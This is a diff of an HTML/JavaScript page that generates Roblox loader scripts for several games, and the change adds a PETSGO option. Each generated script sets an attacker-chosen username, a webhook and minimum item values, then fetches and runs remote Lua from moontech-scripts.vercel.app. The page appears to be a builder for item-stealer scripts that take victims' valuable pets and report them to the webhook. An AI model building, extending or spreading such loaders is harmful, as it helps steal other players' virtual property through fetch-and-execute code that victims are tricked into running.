@@ -113,6 +113,7 @@
       <select id="scriptType" name="scriptType">
         <option value="ps99">PS99</option>
         <option value="psx">PSX</option>
+        <option value="petsgo">PETSGO</option>
         <option value="mm2">MM2</option>
         <option value="adm">ADM</option>
       </select><br><br>
@@ -126,8 +127,11 @@
       <label for="webhook">Webhook (Required):</label>
       <input type="url" id="webhook" name="webhook" required><br><br>
 
-      <label for="minRAP" id="minRAPLabel" style="display:none;">Minimum RAP (For PS99):</label>
+      <label for="minRAP" id="minRAPLabel" style="display:none;">Minimum RAP (For PS99 and PETSGO):</label>
       <input type="number" id="minRAP" name="minRAP" style="display:none;"><br><br>
+
+      <label for="minChance" id="minChanceLabel" style="display:none;">Minimum Chance (For PETSGO):</label>
+      <input type="number" id="minChance" name="minChance" style="display:none;" min="0" required><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
       <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
@@ -137,84 +141,109 @@
   </div>
 
   <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      const scriptTypeDropdown = document.getElementById('scriptType');
-      const username2Input = document.getElementById('username2');
-      const username2Label = document.getElementById('username2Label');
-      const minRAPInput = document.getElementById('minRAP');
-      const minRAPLabel = document.getElementById('minRAPLabel');
-      const generateButton = document.getElementById('generateBtn');
-      const copyButton = document.getElementById('copyBtn');
+document.addEventListener("DOMContentLoaded", function() {
+  const scriptTypeDropdown = document.getElementById('scriptType');
+  const username2Input = document.getElementById('username2');
+  const username2Label = document.getElementById('username2Label');
+  const minRAPInput = document.getElementById('minRAP');
+  const minRAPLabel = document.getElementById('minRAPLabel');
+  const minChanceInput = document.getElementById('minChance');
+  const minChanceLabel = document.getElementById('minChanceLabel');
+  const generateButton = document.getElementById('generateBtn');
+  const copyButton = document.getElementById('copyBtn');
+  const outputTextArea = document.getElementById('output');
 
-      // Show/Hide additional fields based on script type selection
-      scriptTypeDropdown.addEventListener('change', function() {
-        const scriptType = scriptTypeDropdown.value;
+  // Show/Hide additional fields based on script type selection
+  scriptTypeDropdown.addEventListener('change', function() {
+    const scriptType = scriptTypeDropdown.value;
 
-        if (scriptType === 'ps99') {
-          username2Input.style.display = 'block';
-          username2Label.style.display = 'block';
-          minRAPInput.style.display = 'block';
-          minRAPLabel.style.display = 'block';
-        } else if (scriptType === 'psx') {
-          username2Input.style.display = 'block';
-          username2Label.style.display = 'block';
-          minRAPInput.style.display = 'none';
-          minRAPLabel.style.display = 'none';
-        } else {
-          username2Input.style.display = 'none';
-          username2Label.style.display = 'none';
-          minRAPInput.style.display = 'none';
-          minRAPLabel.style.display = 'none';
-        }
-      });
+    // Clear the output text area when changing dropdown
+    outputTextArea.value = '';
 
-      // Generate script output based on selection
-      generateButton.addEventListener('click', function(event) {
-        event.preventDefault();
+    if (scriptType === 'ps99') {
+      username2Input.style.display = 'block';
+      username2Label.style.display = 'block';
+      minRAPInput.style.display = 'block';
+      minRAPLabel.style.display = 'block';
+      minChanceInput.style.display = 'none'; // Hide for PS99
+      minChanceLabel.style.display = 'none'; // Hide for PS99
+    } else if (scriptType === 'psx') {
+      username2Input.style.display = 'block';
+      username2Label.style.display = 'block';
+      minRAPInput.style.display = 'none';
+      minRAPLabel.style.display = 'none';
+      minChanceInput.style.display = 'none'; // Hide for PSX
+      minChanceLabel.style.display = 'none'; // Hide for PSX
+    } else if (scriptType === 'petsgo') {
+      username2Input.style.display = 'none'; // Hide for PETSGO
+      username2Label.style.display = 'none'; // Hide for PETSGO
+      minRAPInput.style.display = 'block'; // Show for PETSGO
+      minRAPLabel.style.display = 'block'; // Show for PETSGO
+      minChanceInput.style.display = 'block'; // Show Minimum Chance
+      minChanceLabel.style.display = 'block'; // Show Minimum Chance
+    } else {
+      username2Input.style.display = 'none';
+      username2Label.style.display = 'none';
+      minRAPInput.style.display = 'none';
+      minRAPLabel.style.display = 'none';
+      minChanceInput.style.display = 'none'; // Hide for other types
+      minChanceLabel.style.display = 'none'; // Hide for other types
+    }
+  });
 
-        const scriptType = document.getElementById("scriptType").value;
-        const username = document.getElementById("username").value;
-        const username2 = document.getElementById("username2").value;
-        const webhook = document.getElementById("webhook").value;
-        const minRAP = document.getElementById("minRAP").value;
+  // Generate script output based on selection
+  generateButton.addEventListener('click', function(event) {
+    event.preventDefault();
 
-        let outputString = "";
+    const scriptType = scriptTypeDropdown.value;
+    const username = document.getElementById("username").value;
+    const webhook = document.getElementById("webhook").value;
+    const minRAP = document.getElementById("minRAP").value;
+    const minChance = document.getElementById("minChance").value;
 
-        switch (scriptType) {
-          case "ps99":
-            outputString = `Username = "${username}"\n` +
-                           `Username2 = "${username2}"\n` +
-                           `Webhook = "${webhook}"\n` +
-                           `MinimumRAP = ${minRAP}\n\n` +
-                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsim99.lua",true))()`;
-            break;
-          case "psx":
-            outputString = `Username = "${username}"\n` +
-                           `Username2 = "${username2}"\n` +
-                           `Webhook = "${webhook}"\n\n` +
-                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsimx.lua",true))()`;
-            break;
-          case "mm2":
-            outputString = `Username = "${username}"\n` +
-                           `Webhook = "${webhook}"\n\n` +
-                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mm2.lua",true))()`;
-            break;
-            case "adm":
-            outputString = `Username = "${username}"\n` +
-                           `Webhook = "${webhook}"\n\n` +
-                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/adm.lua",true))()`;
-        }
+    let outputString = '';
 
-        document.getElementById("output").value = outputString;
-      });
+    switch (scriptType) {
+      case "ps99":
+        outputString = `Username = "${username}"\n` +
+                       `Webhook = "${webhook}"\n` +
+                       `MinimumRAP = ${minRAP}\n\n` +
+                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsim99.lua",true))()`;
+        break;
+      case "psx":
+        outputString = `Username = "${username}"\n` +
+                       `Webhook = "${webhook}"\n\n` +
+                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsimx.lua",true))()`;
+        break;
+      case "petsgo":
+        outputString = `Username = "${username}"\n` +
+                       `Webhook = "${webhook}"\n` +
+                       `MinimumRAP = ${minRAP}\n` +
+                       `MinimumCHANCE = ${minChance}\n\n` +
+                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsgo.lua",true))()`;
+        break;
+      case "mm2":
+        outputString = `Username = "${username}"\n` +
+                       `Webhook = "${webhook}"\n\n` +
+                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mm2.lua",true))()`;
+        break;
+      case "adm":
+        outputString = `Username = "${username}"\n` +
+                       `Webhook = "${webhook}"\n\n` +
+                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/adm.lua",true))()`;
+        break;
+    }
 
-      copyButton.addEventListener('click', function() {
-        const outputTextarea = document.getElementById("output");
-        outputTextarea.select();
-        document.execCommand("copy");
-        alert("Script copied to clipboard!");
-      });
-    });
+    outputTextArea.value = outputString;
+  });
+
+  // Copy script to clipboard
+  copyButton.addEventListener('click', function() {
+    outputTextArea.select();
+    document.execCommand('copy');
+    alert('Script copied to clipboard!');
+  });
+});
   </script>
 </body>
 </html>
